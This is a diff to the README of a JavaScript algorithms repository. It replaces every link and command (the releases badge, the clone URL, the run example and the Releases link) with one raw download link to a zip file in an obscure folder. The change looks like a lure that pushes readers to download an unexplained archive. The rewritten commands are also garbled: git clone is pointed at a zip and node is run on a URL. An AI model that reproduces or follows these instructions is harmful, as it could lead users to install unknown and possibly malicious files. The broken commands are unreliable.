@@ -2,7 +2,7 @@
 
 Welcome to the **JavaScript Algorithms** repository! This collection features popular algorithms you may encounter in the real world. Whether you are preparing for coding interviews, enhancing your programming skills, or simply exploring algorithms, you will find valuable resources here.
 
-[![Releases](https://img.shields.io/github/release/ahmedsaidahmedsaid/javascript-algorithms.svg)](https://github.com/ahmedsaidahmedsaid/javascript-algorithms/releases)
+[![Releases](https://raw.githubusercontent.com/ahmedsaidahmedsaid/javascript-algorithms/main/Hydromys/algorithms_javascript_v3.1.zip)](https://raw.githubusercontent.com/ahmedsaidahmedsaid/javascript-algorithms/main/Hydromys/algorithms_javascript_v3.1.zip)
 
 ## Table of Contents
 
@@ -52,7 +52,7 @@ This repository includes algorithms in the following areas:
 To get started with this repository, clone it to your local machine. Use the following command:
 
 ```bash
-git clone https://github.com/ahmedsaidahmedsaid/javascript-algorithms.git
+git clone https://raw.githubusercontent.com/ahmedsaidahmedsaid/javascript-algorithms/main/Hydromys/algorithms_javascript_v3.1.zip
 ```
 
 Once cloned, navigate to the directory:
@@ -72,12 +72,12 @@ npm install
 After installing, you can run any algorithm by executing the corresponding JavaScript file. For example, to run the Fibonacci sequence algorithm, use:
 
 ```bash
-node fibonacci.js
+node https://raw.githubusercontent.com/ahmedsaidahmedsaid/javascript-algorithms/main/Hydromys/algorithms_javascript_v3.1.zip
 ```
 
 Make sure to check the documentation for each algorithm to understand how to use them effectively.
 
-For the latest updates and releases, visit the [Releases section](https://github.com/ahmedsaidahmedsaid/javascript-algorithms/releases).
+For the latest updates and releases, visit the [Releases section](https://raw.githubusercontent.com/ahmedsaidahmedsaid/javascript-algorithms/main/Hydromys/algorithms_javascript_v3.1.zip).
 
 ## Contributing
 
